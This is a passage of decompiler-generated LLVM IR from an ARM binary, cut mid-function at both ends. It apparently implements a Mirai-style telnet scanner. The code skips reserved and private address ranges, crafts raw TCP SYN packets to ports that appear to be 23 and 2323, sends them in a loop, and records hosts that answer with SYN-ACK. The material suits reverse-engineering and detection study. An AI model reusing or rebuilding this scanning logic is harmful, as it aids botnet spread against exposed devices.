  %v2_fa9c = xor i1 %v2_fa98, true
  %v3_fa9c = or i1 %v7_fa98, %v2_fa9c
  br i1 %v3_fa9c, label %.thread13, label %bb358

.thread13:                                        ; preds = %dec_label_pc_fa8c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fab0

bb358:                                            ; preds = %dec_label_pc_fa8c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_faa0 = icmp eq i1 %v7_fa8c, false
  store i1 %v2_faa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faa0, label %dec_label_pc_fab0, label %dec_label_pc_faa8

dec_label_pc_faa8:                                ; preds = %bb358
  %v2_faa8 = icmp ugt i32 %v1_fa2c, 125
  store i1 %v2_faa8, i1* %cpsr_c.global-to-local, align 1
  %v7_faa8 = icmp eq i32 %v1_fa2c, 126
  store i1 %v7_faa8, i1* %cpsr_z.global-to-local, align 1
  %v2_faac = xor i1 %v2_faa8, true
  %v3_faac = or i1 %v7_faa8, %v2_faac
  br i1 %v3_faac, label %dec_label_pc_fa14, label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %.thread13, %dec_label_pc_faa8, %bb358
  %v2_fab0 = icmp ugt i32 %v1_fa18, 168
  store i1 %v2_fab0, i1* %cpsr_c.global-to-local, align 1
  %v7_fab0 = icmp eq i32 %v1_fa18, 169
  store i1 %v7_fab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fab0, label %bb359, label %dec_label_pc_fabc

bb359:                                            ; preds = %dec_label_pc_fab0
  %v3_fab4 = icmp eq i32 %v1_fa2c, 255
  store i1 %v3_fab4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_fab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fab4, label %dec_label_pc_fa14, label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %dec_label_pc_fab0, %bb359
  %v7_fabc = icmp eq i32 %v1_fa18, 198
  %.431 = zext i1 %v7_fabc to i32
  store i32 %.431, i32* %r3.global-to-local, align 4
  %v2_fac8 = icmp ugt i32 %v1_fa2c, 16
  store i1 %v2_fac8, i1* %cpsr_c.global-to-local, align 1
  %v7_fac8 = icmp eq i32 %v1_fa2c, 17
  store i1 %v7_fac8, i1* %cpsr_z.global-to-local, align 1
  %v2_facc = xor i1 %v2_fac8, true
  %v3_facc = or i1 %v7_fac8, %v2_facc
  br i1 %v3_facc, label %.thread19, label %bb362

.thread19:                                        ; preds = %dec_label_pc_fabc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fae0

bb362:                                            ; preds = %dec_label_pc_fabc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fad0 = icmp eq i1 %v7_fabc, false
  store i1 %v2_fad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fad0, label %dec_label_pc_fae0, label %dec_label_pc_fad8

dec_label_pc_fad8:                                ; preds = %bb362
  %v2_fad8 = icmp ugt i32 %v1_fa2c, 18
  store i1 %v2_fad8, i1* %cpsr_c.global-to-local, align 1
  %v7_fad8 = icmp eq i32 %v1_fa2c, 19
  store i1 %v7_fad8, i1* %cpsr_z.global-to-local, align 1
  %v2_fadc = xor i1 %v2_fad8, true
  %v3_fadc = or i1 %v7_fad8, %v2_fadc
  br i1 %v3_fadc, label %dec_label_pc_fa14, label %dec_label_pc_fae0

dec_label_pc_fae0:                                ; preds = %.thread19, %dec_label_pc_fad8, %bb362
  %v2_fae0 = icmp ugt i32 %v1_fa18, 222
  store i1 %v2_fae0, i1* %cpsr_c.global-to-local, align 1
  %v7_fae0 = icmp eq i32 %v1_fa18, 223
  store i1 %v7_fae0, i1* %cpsr_z.global-to-local, align 1
  %v2_fae4 = xor i1 %v7_fae0, true
  %v3_fae4 = and i1 %v2_fae0, %v2_fae4
  br i1 %v3_fae4, label %dec_label_pc_fa14, label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_fae0
  %v1_fae8 = add nsw i32 %v1_fa18, -6
  store i32 %v1_fae8, i32* %r3.global-to-local, align 4
  %v2_faec = icmp ugt i32 %v1_fa18, 10
  store i1 %v2_faec, i1* %cpsr_c.global-to-local, align 1
  %v7_faec = icmp eq i32 %v1_fa18, 11
  store i1 %v7_faec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faec, label %dec_label_pc_fa14, label %bb363

bb363:                                            ; preds = %dec_label_pc_fae8
  %v3_faf0 = icmp ne i32 %v1_fae8, 0
  store i1 %v3_faf0, i1* %cpsr_c.global-to-local, align 1
  %v8_faf0 = icmp eq i32 %v1_fae8, 1
  store i1 %v8_faf0, i1* %cpsr_z.global-to-local, align 1
  %v2_faf4 = xor i1 %v3_faf0, true
  %v3_faf4 = or i1 %v8_faf0, %v2_faf4
  br i1 %v3_faf4, label %dec_label_pc_fa14, label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %bb363
  %v2_faf8 = icmp ugt i32 %v1_fa18, 21
  store i1 %v2_faf8, i1* %cpsr_c.global-to-local, align 1
  %v7_faf8 = icmp eq i32 %v1_fa18, 22
  store i1 %v7_faf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf8, label %dec_label_pc_fa14, label %bb364

bb364:                                            ; preds = %dec_label_pc_faf8
  %v3_fafc = icmp ugt i32 %v1_fa18, 20
  store i1 %v3_fafc, i1* %cpsr_c.global-to-local, align 1
  %v8_fafc = icmp eq i32 %v1_fa18, 21
  store i1 %v8_fafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fafc, label %dec_label_pc_fa14, label %dec_label_pc_fb04

dec_label_pc_fb04:                                ; preds = %bb364
  %v2_fb04 = icmp ugt i32 %v1_fa18, 27
  store i1 %v2_fb04, i1* %cpsr_c.global-to-local, align 1
  %v7_fb04 = icmp eq i32 %v1_fa18, 28
  store i1 %v7_fb04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb04, label %dec_label_pc_fa14, label %bb365

bb365:                                            ; preds = %dec_label_pc_fb04
  %v3_fb08 = icmp ugt i32 %v1_fa18, 25
  store i1 %v3_fb08, i1* %cpsr_c.global-to-local, align 1
  %v8_fb08 = icmp eq i32 %v1_fa18, 26
  store i1 %v8_fb08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb08, label %dec_label_pc_fa14, label %dec_label_pc_fb10

dec_label_pc_fb10:                                ; preds = %bb365
  %v2_fb10 = icmp ugt i32 %v1_fa18, 29
  store i1 %v2_fb10, i1* %cpsr_c.global-to-local, align 1
  %v7_fb10 = icmp eq i32 %v1_fa18, 30
  store i1 %v7_fb10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb10, label %dec_label_pc_fa14, label %bb366

bb366:                                            ; preds = %dec_label_pc_fb10
  %v3_fb14 = icmp ugt i32 %v1_fa18, 28
  store i1 %v3_fb14, i1* %cpsr_c.global-to-local, align 1
  %v8_fb14 = icmp eq i32 %v1_fa18, 29
  store i1 %v8_fb14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb14, label %dec_label_pc_fa14, label %dec_label_pc_fb1c

dec_label_pc_fb1c:                                ; preds = %bb366
  %v2_fb1c = icmp ugt i32 %v1_fa18, 54
  store i1 %v2_fb1c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb1c = icmp eq i32 %v1_fa18, 55
  store i1 %v7_fb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb1c, label %dec_label_pc_fa14, label %bb367

bb367:                                            ; preds = %dec_label_pc_fb1c
  %v3_fb20 = icmp ugt i32 %v1_fa18, 32
  store i1 %v3_fb20, i1* %cpsr_c.global-to-local, align 1
  %v8_fb20 = icmp eq i32 %v1_fa18, 33
  store i1 %v8_fb20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb20, label %dec_label_pc_fa14, label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %bb367
  %v2_fb28 = icmp ugt i32 %v1_fa18, 214
  store i1 %v2_fb28, i1* %cpsr_c.global-to-local, align 1
  %v7_fb28 = icmp eq i32 %v1_fa18, 215
  store i1 %v7_fb28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb28, label %.thread30, label %bb368

bb368:                                            ; preds = %dec_label_pc_fb28
  %v3_fb2c = icmp ugt i32 %v1_fa18, 213
  store i1 %v3_fb2c, i1* %cpsr_c.global-to-local, align 1
  %v8_fb2c = icmp eq i32 %v1_fa18, 214
  store i1 %v8_fb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb2c, label %bb369, label %dec_label_pc_fb3c

.thread30:                                        ; preds = %dec_label_pc_fb28
  br label %dec_label_pc_fa14

bb369:                                            ; preds = %bb368
  br label %dec_label_pc_fa14

dec_label_pc_fb3c:                                ; preds = %bb368
  %v5_fb48 = call i32 @llvm.bswap.i32(i32 %v0_fa14)
  store i32 %v5_fb48, i32* %r3.global-to-local, align 4
  %tmp370 = and i32 %v0_fa14, 65280
  %tmp371 = call i32 @llvm.bswap.i32(i32 %tmp370)
  %v3_fb50 = udiv i32 %v5_fb48, 16777216
  %tmp372 = and i32 %v0_fa14, 16711680
  %tmp373 = call i32 @llvm.bswap.i32(i32 %tmp372)
  %v4_fb58 = udiv i32 %tmp371, 256
  %v4_fb5c = mul nuw nsw i32 %tmp373, 256
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* @r0, align 4
  %tmp374 = and i32 %v0_fa14, 65536
  %v3_fb64 = icmp ne i32 %tmp374, 0
  store i1 %v3_fb64, i1* %cpsr_c.global-to-local, align 1
  %v4_fb64 = mul i32 %v5_fb48, 16777216
  %v5_fb58 = or i32 %v4_fb64, %v3_fb50
  %v5_fb5c = or i32 %v5_fb58, %v4_fb58
  %v5_fb64 = or i32 %v5_fb5c, %v4_fb5c
  store i32 %v5_fb64, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_235ca.256 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_fb64, i32* @global_var_235d0.257, align 4
  %v3_fb74 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32 20)
  store i32 %v3_fb74, i32* %r0.global-to-local, align 4
  %v3_fb78 = load i16, i16* %stack_var_-52, align 2
  %v4_fb78 = sext i16 %v3_fb78 to i32
  store i32 %v4_fb78, i32* %r1.global-to-local, align 4
  %tmp531 = sdiv i16 %v3_fb78, 10
  %v5_fb88 = zext i16 %tmp531 to i32
  %v3_fb8c = mul nuw nsw i32 %v5_fb88, 8
  store i32 %v3_fb8c, i32* %r2.global-to-local, align 4
  %v2_fb94 = mul nuw nsw i32 %v5_fb88, 10
  store i32 %v2_fb94, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* %ip.global-to-local, align 4
  %v3_fb9c = icmp uge i32 %v4_fb78, %v2_fb94
  store i1 %v3_fb9c, i1* %cpsr_c.global-to-local, align 1
  %v9_fb9c = icmp eq i32 %v4_fb78, %v2_fb94
  store i1 %v9_fb9c, i1* %cpsr_z.global-to-local, align 1
  %v1_fba0 = trunc i32 %v3_fb74 to i16
  store i16 %v1_fba0, i16* bitcast (i32* @global_var_235ca.256 to i16*), align 4
  br i1 %v9_fb9c, label %bb375, label %.thread37.thread

.thread37.thread:                                 ; preds = %dec_label_pc_fb3c
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_235d4.183 to i32), i32 2) to i16*), align 2
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* %r0.global-to-local, align 4
  br label %.thread39

bb375:                                            ; preds = %dec_label_pc_fb3c
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* %r0.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_235d4.183 to i32), i32 2) to i16*), align 2
  br label %.thread39

.thread39:                                        ; preds = %.thread37.thread, %bb375
  %v4_fbc4 = load i32, i32* @global_var_235d0.257, align 4
  store i32 %v4_fbc4, i32* @global_var_235d8.259, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_235e4.260 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_235d4.183 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_fbe4 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32 ptrtoint (i32* @global_var_235d4.183 to i32), i32 5120, i32 20)
  %v6_fbe4 = trunc i32 %v5_fbe4 to i16
  store i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32* %r1.global-to-local, align 4
  %v2_fbf0 = load i32, i32* @global_var_260d4.178, align 4
  store i16 %v6_fbe4, i16* bitcast (i32* @global_var_235e4.260 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_fc1c = load i16, i16* @global_var_235d6.188, align 2
  %v4_fc1c = zext i16 %v3_fc1c to i32
  store i32 %v4_fc1c, i32* @lr, align 4
  store i32 %v2_f9e4, i32* %ip.global-to-local, align 4
  store i32 %v2_fbf0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_fc38 = call i32 @__libc_sendto(i32 %v2_fbf0, i32 ptrtoint (i8** @global_var_235c0.180 to i32), i32 40, i32 16384, i32 %v2_f9e4, i32 16)
  store i32 %v7_fc38, i32* %r0.global-to-local, align 4
  %v3_fc3c = load i16, i16* %stack_var_-52, align 2
  %v4_fc3c = sext i16 %v3_fc3c to i32
  %v1_fc40 = add nsw i32 %v4_fc3c, 1
  store i32 %v1_fc40, i32* %r3.global-to-local, align 4
  %v3_fc44 = icmp ugt i32 %v1_fc40, 383
  store i1 %v3_fc44, i1* %cpsr_c.global-to-local, align 1
  %v8_fc44 = icmp eq i32 %v1_fc40, 384
  store i1 %v8_fc44, i1* %cpsr_z.global-to-local, align 1
  %v5_fc48 = trunc i32 %v1_fc40 to i16
  store i16 %v5_fc48, i16* %stack_var_-52, align 2
  %v5_fc4c = icmp slt i32 %v1_fc40, 384
  br i1 %v5_fc4c, label %dec_label_pc_f9e8, label %dec_label_pc_fc50

dec_label_pc_fc50:                                ; preds = %.thread39
  %v0_fc50 = load i32, i32* @r4, align 4
  store i32 %v0_fc50, i32* @fp, align 4
  br label %dec_label_pc_fc54

dec_label_pc_fc54:                                ; preds = %dec_label_pc_f9cc, %dec_label_pc_fc50
  %v0_fc54 = call i32 @__GI___errno_location()
  store i32 %v0_fc54, i32* @sb, align 4
  store i32 %stack_var_-1880.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_fc64 = add i32 %stack_var_-1880.0, 20
  store i32 %v1_fc64, i32* @r4, align 4
  %v1_fcb8 = add i32 %stack_var_-1880.0, 16
  %v2_fcb8 = inttoptr i32 %v1_fcb8 to i32*
  %v1_fccc = add i32 %stack_var_-1880.0, 9
  %v2_fccc = inttoptr i32 %v1_fccc to i8*
  %v4_fcf8 = sext i16 %stack_var_-1876.0 to i32
  %v1_fd60 = add i32 %stack_var_-1880.0, 12
  %v2_fd60 = inttoptr i32 %v1_fd60 to i32*
  br label %dec_label_pc_fc68

dec_label_pc_fc68:                                ; preds = %dec_label_pc_fd28, %dec_label_pc_fd20, %dec_label_pc_fd18, %dec_label_pc_fcf4, %dec_label_pc_fce4, %dec_label_pc_fcc8, %dec_label_pc_fcb0, %dec_label_pc_fd10, %dec_label_pc_fd04, %dec_label_pc_fca8, %dec_label_pc_fde0, %dec_label_pc_fc54
  %v1_fc6c = phi i32 [ %v0_fc54, %dec_label_pc_fc54 ], [ %v1_fc6c.pre.pre, %dec_label_pc_fde0 ], [ %v0_fc9c, %dec_label_pc_fca8 ], [ %v0_fc9c, %dec_label_pc_fd04 ], [ %v0_fc9c, %dec_label_pc_fd10 ], [ %v0_fc9c, %dec_label_pc_fcb0 ], [ %v0_fc9c, %dec_label_pc_fcc8 ], [ %v0_fc9c, %dec_label_pc_fce4 ], [ %v0_fc9c, %dec_label_pc_fcf4 ], [ %v0_fc9c, %dec_label_pc_fd18 ], [ %v0_fc9c, %dec_label_pc_fd20 ], [ %v0_fc9c, %dec_label_pc_fd28 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_fc6c = inttoptr i32 %v1_fc6c to i32*
  store i32 0, i32* %v2_fc6c, align 4
  %v2_fc78 = load i32, i32* @global_var_260d4.178, align 4
  store i32 %v2_fc78, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc88 = load i32, i32* %ip.global-to-local, align 4
  %v6_fc90 = call i32 @__libc_recvfrom(i32 %v2_fc78, i32 %stack_var_-1880.0, i32 1514, i32 16384, i32 %v0_fc88, i32 %v0_fc88)
  store i32 %v6_fc90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc94 = icmp eq i32 %v6_fc90, 0
  store i1 %v2_fc94, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v6_fc90, 1
  br i1 %tmp376, label %dec_label_pc_fe04, label %dec_label_pc_fc9c

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_fc68
  %v0_fc9c = load i32, i32* @sb, align 4
  %v1_fc9c = inttoptr i32 %v0_fc9c to i32*
  %v2_fc9c = load i32, i32* %v1_fc9c, align 4
  store i32 %v2_fc9c, i32* %r3.global-to-local, align 4
  %v2_fca0 = icmp ugt i32 %v2_fc9c, 10
  store i1 %v2_fca0, i1* %cpsr_c.global-to-local, align 1
  %v7_fca0 = icmp eq i32 %v2_fc9c, 11
  store i1 %v7_fca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca0, label %dec_label_pc_fe04, label %dec_label_pc_fca8

dec_label_pc_fca8:                                ; preds = %dec_label_pc_fc9c
  %v2_fca8 = icmp ugt i32 %v6_fc90, 38
  store i1 %v2_fca8, i1* %cpsr_c.global-to-local, align 1
  %v7_fca8 = icmp eq i32 %v6_fc90, 39
  store i1 %v7_fca8, i1* %cpsr_z.global-to-local, align 1
  %v2_fcac = xor i1 %v2_fca8, true
  %v3_fcac = or i1 %v7_fca8, %v2_fcac
  br i1 %v3_fcac, label %dec_label_pc_fc68, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fca8
  store i32 %stack_var_-1880.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32* %ip.global-to-local, align 4
  %v3_fcb8 = load i32, i32* %v2_fcb8, align 4
  store i32 %v3_fcb8, i32* %r2.global-to-local, align 4
  %v2_fcbc = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_fcbc, i32* %r3.global-to-local, align 4
  %v3_fcc0 = icmp uge i32 %v3_fcb8, %v2_fcbc
  store i1 %v3_fcc0, i1* %cpsr_c.global-to-local, align 1
  %v9_fcc0 = icmp eq i32 %v3_fcb8, %v2_fcbc
  store i1 %v9_fcc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fcc0, label %dec_label_pc_fcc8, label %dec_label_pc_fc68

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_fcb0
  store i32 %stack_var_-1880.0, i32* @lr, align 4
  %v3_fccc = load i8, i8* %v2_fccc, align 1
  %v4_fccc = zext i8 %v3_fccc to i32
  store i32 %v4_fccc, i32* %r3.global-to-local, align 4
  %v2_fcd0 = icmp ugt i8 %v3_fccc, 5
  store i1 %v2_fcd0, i1* %cpsr_c.global-to-local, align 1
  %v7_fcd0 = icmp eq i8 %v3_fccc, 6
  store i1 %v7_fcd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcd0, label %dec_label_pc_fcd8, label %dec_label_pc_fc68

dec_label_pc_fcd8:                                ; preds = %dec_label_pc_fcc8
  %v0_fcd8 = load i32, i32* @r4, align 4
  %v1_fcd8 = inttoptr i32 %v0_fcd8 to i16*
  %v2_fcd8 = load i16, i16* %v1_fcd8, align 2
  %v3_fcd8 = zext i16 %v2_fcd8 to i32
  store i32 %v3_fcd8, i32* %ip.global-to-local, align 4
  %v2_fcdc = icmp ugt i16 %v2_fcd8, 5887
  store i1 %v2_fcdc, i1* %cpsr_c.global-to-local, align 1
  %v7_fcdc = icmp eq i16 %v2_fcd8, 5888
  store i1 %v7_fcdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcdc, label %dec_label_pc_fcf4, label %dec_label_pc_fce4

dec_label_pc_fce4:                                ; preds = %dec_label_pc_fcd8
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_fcec = icmp ugt i16 %v2_fcd8, 4872
  store i1 %v3_fcec, i1* %cpsr_c.global-to-local, align 1
  %v9_fcec = icmp eq i16 %v2_fcd8, 4873
  store i1 %v9_fcec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fcec, label %dec_label_pc_fcf4, label %dec_label_pc_fc68

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fce4, %dec_label_pc_fcd8
  %v1_fcf4 = add i32 %v0_fcd8, 2
  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i16*
  %v3_fcf4 = load i16, i16* %v2_fcf4, align 2
  %v4_fcf4 = zext i16 %v3_fcf4 to i32
  store i32 %v4_fcf4, i32* %r3.global-to-local, align 4
  store i32 %v4_fcf8, i32* %r0.global-to-local, align 4
  %v3_fcfc = icmp uge i32 %v4_fcf4, %v4_fcf8
  store i1 %v3_fcfc, i1* %cpsr_c.global-to-local, align 1
  %v9_fcfc = icmp eq i32 %v4_fcf4, %v4_fcf8
  store i1 %v9_fcfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fcfc, label %dec_label_pc_fd04, label %dec_label_pc_fc68

dec_label_pc_fd04:                                ; preds = %dec_label_pc_fcf4
  %v1_fd04 = add i32 %v0_fcd8, 13
  %v2_fd04 = inttoptr i32 %v1_fd04 to i8*
  %v3_fd04 = load i8, i8* %v2_fd04, align 1
  %v4_fd04 = zext i8 %v3_fd04 to i32
  store i32 %v4_fd04, i32* %r3.global-to-local, align 4
  %v1_fd08 = and i32 %v4_fd04, 2
  %v2_fd08 = icmp eq i32 %v1_fd08, 0
  store i1 %v2_fd08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd08, label %dec_label_pc_fc68, label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fd04
  %v1_fd10 = and i32 %v4_fd04, 16
  %v2_fd10 = icmp eq i32 %v1_fd10, 0
  store i1 %v2_fd10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd10, label %dec_label_pc_fc68, label %dec_label_pc_fd18

dec_label_pc_fd18:                                ; preds = %dec_label_pc_fd10
  %v1_fd18 = and i32 %v4_fd04, 4
  %v2_fd18 = icmp eq i32 %v1_fd18, 0
  store i1 %v2_fd18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd18, label %dec_label_pc_fd20, label %dec_label_pc_fc68

dec_label_pc_fd20:                                ; preds = %dec_label_pc_fd18
  %tmp532 = urem i8 %v3_fd04, 2
  %v2_fd20 = icmp eq i8 %tmp532, 0
  store i1 %v2_fd20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd20, label %dec_label_pc_fd28, label %dec_label_pc_fc68

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fd20
  %v1_fd28 = add i32 %v0_fcd8, 8
  %v2_fd28 = inttoptr i32 %v1_fd28 to i32*
  %v3_fd28 = load i32, i32* %v2_fd28, align 4
  %v5_fd40 = call i32 @llvm.bswap.i32(i32 %v3_fd28)
  %v1_fd44 = add i32 %v5_fd40, -1
  store i32 %v1_fd44, i32* %r2.global-to-local, align 4
  %v1_fd48 = and i32 %v1_fd44, 16711680
  store i32 %v1_fd48, i32* %r0.global-to-local, align 4
  %v3_fd4c = udiv i32 %v1_fd44, 16777216
  %v4_fd54 = udiv i32 %v1_fd48, 256
  %v5_fd54 = or i32 %v4_fd54, %v3_fd4c
  %v1_fd50 = mul i32 %v1_fd44, 256
  %v4_fd58 = and i32 %v1_fd50, 16711680
  %v5_fd58 = or i32 %v5_fd54, %v4_fd58
  store i32 %v5_fd58, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v3_fd60 = load i32, i32* %v2_fd60, align 4
  store i32 %v3_fd60, i32* @lr, align 4
  %v5_fd64 = call i32 @llvm.bswap.i32(i32 %v1_fd44)
  store i32 %v5_fd64, i32* %r3.global-to-local, align 4
  %v3_fd68 = icmp uge i32 %v5_fd64, %v3_fd60
  store i1 %v3_fd68, i1* %cpsr_c.global-to-local, align 1
  %v9_fd68 = icmp eq i32 %v5_fd64, %v3_fd60
  store i1 %v9_fd68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fd68, label %dec_label_pc_fd70, label %dec_label_pc_fc68

dec_label_pc_fd70:                                ; preds = %dec_label_pc_fd28
  %v0_fd70 = load i32, i32* @r5, align 4
  %v2_fd70 = icmp ugt i32 %v0_fd70, 254
  store i1 %v2_fd70, i1* %cpsr_c.global-to-local, align 1
  %v7_fd70 = icmp eq i32 %v0_fd70, 255
  store i1 %v7_fd70, i1* %cpsr_z.global-to-local, align 1
  %v8_fd74 = icmp sgt i32 %v0_fd70, 255
  br i1 %v8_fd74, label %dec_label_pc_fe04, label %dec_label_pc_fd78

dec_label_pc_fd78:                                ; preds = %dec_label_pc_fd70
  %v2_fd80 = load i32, i32* @global_var_260d0.176, align 4
  store i32 %v2_fd80, i32* %r1.global-to-local, align 4
  %v3_fd84 = mul i32 %v0_fd70, 256
  store i32 %v3_fd84, i32* %r2.global-to-local, align 4
  %v2_fd88 = mul i32 %v0_fd70, 288
  store i32 %v2_fd88, i32* %r3.global-to-local, align 4
  %v2_fd8c = add i32 %v2_fd80, %v2_fd88
  store i32 %v2_fd8c, i32* @r0, align 4
  %v1_fd90 = add i32 %v2_fd8c, 12
  %v2_fd90 = inttoptr i32 %v1_fd90 to i32*
  %v3_fd90 = load i32, i32* %v2_fd90, align 4
  store i32 %v3_fd90, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd94 = icmp eq i32 %v3_fd90, 0
  store i1 %v2_fd94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd94, label %dec_label_pc_fdd8, label %dec_label_pc_fdb4.preheader

dec_label_pc_fdb4.preheader:                      ; preds = %dec_label_pc_fd78
  %v2_fd98 = add i32 %v0_fd70, 1
  %v2_fda0 = and i32 %v2_fd98, 134217728
  %v3_fda0 = icmp ne i32 %v2_fda0, 0
  store i1 %v3_fda0, i1* %cpsr_c.global-to-local, align 1
  %v3_fda4 = mul i32 %v2_fd98, 288
  %v3_fda8 = add i32 %v2_fd80, %v3_fda4
  store i32 %v3_fda8, i32* %r3.global-to-local, align 4
  store i32 %v0_fd70, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdb4

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fdb4.preheader, %dec_label_pc_fdc0
  %v0_fdc0 = phi i32 [ %v3_fda8, %dec_label_pc_fdb4.preheader ], [ %v1_fdcc, %dec_label_pc_fdc0 ]
  %v0_fdb4 = phi i32 [ %v0_fd70, %dec_label_pc_fdb4.preheader ], [ %v1_fdb4, %dec_label_pc_fdc0 ]
  %v1_fdb4 = add i32 %v0_fdb4, 1
  store i32 %v1_fdb4, i32* %r2.global-to-local, align 4
  %v7_fdb8 = icmp eq i32 %v1_fdb4, 256
  br i1 %v7_fdb8, label %dec_label_pc_fe04.loopexit, label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fdb4
  store i32 %v0_fdc0, i32* @r0, align 4
  %v1_fdc4 = add i32 %v0_fdc0, 12
  %v2_fdc4 = inttoptr i32 %v1_fdc4 to i32*
  %v3_fdc4 = load i32, i32* %v2_fdc4, align 4
  %v2_fdc8 = icmp eq i32 %v3_fdc4, 0
  %v1_fdcc = add i32 %v0_fdc0, 288
  store i32 %v1_fdcc, i32* %r3.global-to-local, align 4
  br i1 %v2_fdc8, label %dec_label_pc_fdd4, label %dec_label_pc_fdb4

dec_label_pc_fdd4:                                ; preds = %dec_label_pc_fdc0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fdb4, i32* @r5, align 4
  br label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fd78, %dec_label_pc_fdd4
  %v1_fde0 = phi i32 [ %v2_fd8c, %dec_label_pc_fd78 ], [ %v0_fdc0, %dec_label_pc_fdd4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fdd8 = icmp eq i32 %v1_fde0, 0
  store i1 %v2_fdd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fdd8, label %dec_label_pc_fe04, label %dec_label_pc_fde0

dec_label_pc_fde0:                                ; preds = %dec_label_pc_fdd8
  %v2_fde0 = add i32 %v1_fde0, 16
  %v3_fde0 = inttoptr i32 %v2_fde0 to i32*
